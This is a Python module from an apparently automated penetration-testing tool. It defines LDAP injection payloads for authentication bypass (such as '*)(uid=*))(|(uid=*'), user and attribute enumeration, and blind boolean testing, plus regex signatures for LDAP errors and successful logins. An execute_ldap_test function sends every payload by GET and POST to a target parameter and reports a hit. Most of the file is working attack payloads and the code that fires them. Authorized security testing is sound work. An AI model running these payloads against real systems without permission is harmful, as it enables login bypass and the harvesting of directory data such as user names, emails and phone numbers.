"""
LDAP Injection Detection for AI-Pentester

Comprehensive LDAP injection testing with:
- Authentication bypass payloads
- Data exfiltration payloads
- Blind LDAP injection
- Error-based detection
"""

import re
from typing import Dict, List, Tuple


# =============================================================================
# LDAP INJECTION PAYLOADS
# =============================================================================

# Authentication bypass payloads
LDAP_AUTH_BYPASS = [
    # Basic wildcards
    "*",
    "*)(uid=*))(|(uid=*",
    "*)(&",
    "*))%00",
    
    # OR injection
    "admin)(|(password=*)",
    "admin)(&)",
    "x)(|(objectClass=*)",
    
    # NULL byte termination
    "admin\x00",
    "admin%00",
    
    # Comment injection
    "admin)#",
    "admin)%23",
    
    # Escape sequences
    "admin\\29",
    "admin\\2a",
]

# Data extraction payloads
LDAP_DATA_EXTRACTION = [
    # Enumerate users
    "*)(uid=*",
    ")(uid=*)(|(uid=*",
    "*)(objectClass=user)",
    "*)(objectClass=person)",
    
    # Enumerate groups
    "*)(objectClass=group)",
    "*)(objectClass=groupOfNames)",
    
    # Extract attributes
    "*)(mail=*",
    "*)(telephoneNumber=*",
    "*)(cn=*",
    "*)(sn=*",
]

# Blind LDAP injection (boolean-based)
LDAP_BLIND = [
    # True condition
    ("admin)(|(password=*)", True),
    ("admin)(uid=admin)", True),
    
    # False condition  
    ("admin)(uid=nonexistent123456)", False),
    ("admin)(password=wrongpassword)", False),
]


# =============================================================================
# DETECTION SIGNATURES
# =============================================================================

# Error patterns indicating LDAP processing
LDAP_ERROR_PATTERNS = [
    r"ldap.*error",
    r"invalid\s*dn\s*syntax",
    r"object\s*class\s*violation",
    r"no\s*such\s*object",
    r"naming\s*exception",
    r"javax\.naming",
    r"ldap://",
    r"ldaps://",
    r"active\s*directory",
    r"invalid\s*filter",
    r"bad\s*search\s*filter",
    r"filter\s*error",
    r"unbalanced\s*parenthesis",
    r"cn=.*,dc=",
    r"ou=.*,dc=",
    r"uid=.*,ou=",
]

# Success patterns (auth bypass indicators)
LDAP_SUCCESS_PATTERNS = [
    r"welcome\s*(admin|root|administrator)",
    r"logged\s*in\s*as",
    r"authentication\s*successful",
    r"admin\s*panel",
    r"dashboard",
    r"profile\s*settings",
]


# =============================================================================
# DETECTION FUNCTIONS
# =============================================================================

def get_ldap_payloads(attack_type: str = "all") -> List[Dict]:
    """
    Get LDAP injection payloads.
    
    Args:
        attack_type: "auth_bypass", "data_extraction", "blind", "all"
    
    Returns:
        List of payload dicts
    """
    payloads = []
    
    if attack_type in ["auth_bypass", "all"]:
        for i, p in enumerate(LDAP_AUTH_BYPASS):
            payloads.append({
                "payload": p,
                "type": "auth_bypass",
                "id": f"ldap_auth_{i}"
            })
    
    if attack_type in ["data_extraction", "all"]:
        for i, p in enumerate(LDAP_DATA_EXTRACTION):
            payloads.append({
                "payload": p,
                "type": "data_extraction",
                "id": f"ldap_data_{i}"
            })
    
    if attack_type in ["blind", "all"]:
        for i, (p, expected) in enumerate(LDAP_BLIND):
            payloads.append({
                "payload": p,
                "type": "blind",
                "expected_true": expected,
                "id": f"ldap_blind_{i}"
            })
    
    return payloads


def analyze_ldap_response(
    response_text: str,
    baseline_response: str = None,
    payload_type: str = "auth_bypass"
) -> Tuple[bool, Dict]:
    """
    Analyze response for LDAP injection indicators.
    
    Returns:
        (is_vulnerable, evidence_dict)
    """
    text = response_text.lower()
    
    # Check for LDAP errors (indicates backend processing)
    for pattern in LDAP_ERROR_PATTERNS:
        match = re.search(pattern, text, re.I)
        if match:
            return True, {
                "type": "LDAP Injection",
                "subtype": "error_based",
                "evidence": match.group(0)[:100],
                "confidence": "medium",
                "signal": "ldap_error_disclosed"
            }
    
    # Check for auth bypass success
    if payload_type == "auth_bypass":
        for pattern in LDAP_SUCCESS_PATTERNS:
            match = re.search(pattern, text, re.I)
            if match:
                return True, {
                    "type": "LDAP Injection",
                    "subtype": "auth_bypass",
                    "evidence": match.group(0)[:100],
                    "confidence": "high",
                    "signal": "authentication_bypassed"
                }
    
    # Blind LDAP detection (compare with baseline)
    if baseline_response and payload_type == "blind":
        len_diff = abs(len(response_text) - len(baseline_response))
        if len_diff > 100:  # Significant difference
            return True, {
                "type": "LDAP Injection",
                "subtype": "blind_boolean",
                "evidence": f"Response length diff: {len_diff}",
                "confidence": "medium",
                "signal": "response_length_diff"
            }
    
    return False, {}


def detect_ldap_vectors(response) -> List[str]:
    """
    Detect if endpoint might use LDAP.
    
    Checks forms, URLs, and response patterns.
    """
    vectors = []
    text = response.text.lower()
    
    # Form fields that suggest LDAP
    ldap_fields = ["username", "user", "login", "uid", "cn", "dn"]
    for field in ldap_fields:
        if f'name="{field}"' in text or f"name='{field}'" in text:
            vectors.append(f"form_field_{field}")
    
    # URL patterns
    if "ldap" in response.url.lower():
        vectors.append("ldap_in_url")
    
    # Response patterns
    if "active directory" in text or "ldap" in text:
        vectors.append("ldap_mentioned")
    
    return vectors


def execute_ldap_test(session, target: str, param: str, logger) -> Dict:
    """
    Execute comprehensive LDAP injection tests.
    
    Args:
        session: requests session
        target: target URL
        param: parameter name to inject
        logger: logger instance
    
    Returns:
        Finding dict with status and evidence
    """
    payloads = get_ldap_payloads("all")
    
    # Get baseline response first
    try:
        baseline = session.get(target, params={param: "admin"}, timeout=10)
        baseline_text = baseline.text
    except Exception as _e:
        baseline_text = ""
    
    for payload_info in payloads:
        try:
            # Test with GET
            response = session.get(
                target,
                params={param: payload_info["payload"]},
                timeout=10
            )
            
            is_vuln, evidence = analyze_ldap_response(
                response.text,
                baseline_text,
                payload_info["type"]
            )
            
            if is_vuln:
                logger.info(f"[ldap] Vulnerability FOUND: {payload_info['type']}")
                return {
                    "status": "SUCCESS",
                    "payload": payload_info["payload"],
                    "param": param,
                    "evidence": evidence
                }
            
            # Also test with POST
            response = session.post(
                target,
                data={param: payload_info["payload"]},
                timeout=10
            )
            
            is_vuln, evidence = analyze_ldap_response(
                response.text,
                baseline_text,
                payload_info["type"]
            )
            
            if is_vuln:
                logger.info(f"[ldap] Vulnerability FOUND via POST: {payload_info['type']}")
                return {
                    "status": "SUCCESS",
                    "payload": payload_info["payload"],
                    "param": param,
                    "method": "POST",
                    "evidence": evidence
                }
                
        except Exception as e:
            logger.debug(f"[ldap] Error testing {payload_info['id']}: {e}")
    
    return {
        "status": "FAILED",
        "payload": "ldap_all",
        "evidence": "No LDAP injection detected"
    }


# =============================================================================
# PAYLOAD FILE GENERATION
# =============================================================================

def get_ldap_payload_strings() -> List[str]:
    """Get raw LDAP payload strings for payload_db."""
    return LDAP_AUTH_BYPASS + LDAP_DATA_EXTRACTION
